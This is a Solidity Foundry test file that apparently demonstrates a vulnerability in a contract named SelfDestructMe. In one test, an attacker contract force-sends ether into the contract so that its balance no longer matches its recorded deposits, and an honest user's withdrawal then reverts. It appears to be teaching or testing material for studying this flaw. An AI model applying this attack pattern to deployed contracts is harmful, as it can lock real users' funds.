//SPDX-Licensed-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console} from "forge-std/Test.sol";
import {SelfDestructMe, AttackerSelfDestructMe} from "../src/MisHandlingEth.sol";

contract MisHandlingEthTest is Test {
    SelfDestructMe public selfDestruct;
    AttackerSelfDestructMe public attackerSelfDestruct;
    address user;
    address attacker;

    function setUp() public {
        selfDestruct = new SelfDestructMe();
        attackerSelfDestruct = new AttackerSelfDestructMe(selfDestruct);
        user = makeAddr("user");
        attacker = makeAddr("attacker");
        vm.deal(user, 10 ether);
        vm.deal(attacker, 5 ether);
    }

    function test_userDepositAnWithdraw() public {
        console.log("---- Normal Routine ----");

        vm.startPrank(user);
        selfDestruct.deposit{value: 1 ether}();
        console.log("user eth : ", selfDestruct.deposits(user)); // 1 eth
        console.log("contract eth : ", address(selfDestruct).balance); // 1 eth

        selfDestruct.withdraw(); //
        console.log("user eth : ", selfDestruct.deposits(user)); // 0 eth
        console.log("contract eth : ", address(selfDestruct).balance); // 0 eth
        vm.stopPrank();
    }

    function test_attacker() public {
        console.log("---- Attack Routine ----");

        vm.startPrank(user);
        selfDestruct.deposit{value: 1 ether}();
        console.log("user eth : ", selfDestruct.deposits(user)); // 1 eth
        console.log("contract eth : ", address(selfDestruct).balance); // 1 eth
        vm.stopPrank();

        vm.startPrank(attacker);
        attackerSelfDestruct.attack{value: 3 ether}();
        console.log("contract eth : ", address(selfDestruct).balance); // 4 eth
        console.log("total deposits : ", selfDestruct.totalDeposits()); // 1 eth
        vm.stopPrank();

        vm.startPrank(user);
        vm.expectRevert(); //  expect the next call to revert. If it does not, the test fails.
        selfDestruct.withdraw();
        vm.stopPrank();
    }
}
